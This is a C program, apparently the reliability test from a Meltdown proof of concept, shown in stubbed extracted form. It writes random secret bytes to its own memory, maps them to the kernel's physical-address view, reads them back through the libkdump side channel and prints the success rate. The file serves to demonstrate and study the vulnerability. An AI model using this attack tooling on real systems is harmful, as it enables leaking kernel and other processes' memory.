
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_1__ ;


struct TYPE_4__ {int retries; int measurements; size_t physical_offset; } ;
typedef TYPE_1__ libkdump_config_t ;


 size_t DEFAULT_PHYSICAL_OFFSET ;
 int exit (int) ;
 int fflush (int ) ;
 int libkdump_cleanup () ;
 int libkdump_enable_debug (int ) ;
 TYPE_1__ libkdump_get_autoconfig () ;
 int libkdump_init (TYPE_1__) ;
 size_t libkdump_phys_to_virt (size_t) ;
 int libkdump_read (size_t) ;
 size_t libkdump_virt_to_phys (size_t) ;
 int printf (char*,...) ;
 int rand () ;
 int srand (int ) ;
 int stdout ;
 size_t strtoull (char*,int *,int ) ;
 int time (int *) ;

int main(int argc, char *argv[]) {
  size_t scratch[4096];
  libkdump_config_t config;
  size_t offset = DEFAULT_PHYSICAL_OFFSET;
  int progress = 0;
  unsigned char secret = 'X';

  if(argc == 2) {
    offset = strtoull(argv[1], ((void*)0), 0);
    printf("\x1b[33;1m[+]\x1b[0m Setting physical offset to 0x%zx\n", offset);
  }

  libkdump_enable_debug(0);

  config = libkdump_get_autoconfig();
  config.retries = 10;
  config.measurements = 2;
  config.physical_offset = offset;

  libkdump_init(config);

  size_t var = (size_t)(scratch + 2048);
  *(char*)var = secret;

  size_t start = libkdump_virt_to_phys(var);
  if (!start) {
    printf("\x1b[31;1m[!]\x1b[0m Program requires root privileges (or read access to /proc/<pid>/pagemap)!\n");
    exit(1);
  }

  srand(time(((void*)0)));

  size_t correct = 0, wrong = 0, failcounter = 0;
  size_t phys = libkdump_phys_to_virt(start);
  while (1) {
    *(volatile unsigned char*)var = secret;

    int res = libkdump_read(phys);
    if (res == secret) {
      correct++;
    } else if(res != 0) {
      wrong++;
    } else {
      failcounter++;
      if(failcounter < 1000) {
        continue;
      } else {
        failcounter = 0;
        wrong++;
      }
    }
    printf("\r\x1b[34;1m[%c]\x1b[0m Success rate: %.2f%% (read %zd values)    ", "/-\\|"[(progress++ / 100) % 4], (100.f * (double)correct) / (double)(correct + wrong), correct + wrong);
    fflush(stdout);
    secret = (rand() % 255) + 1;
  }

  libkdump_cleanup();

  return 0;
}
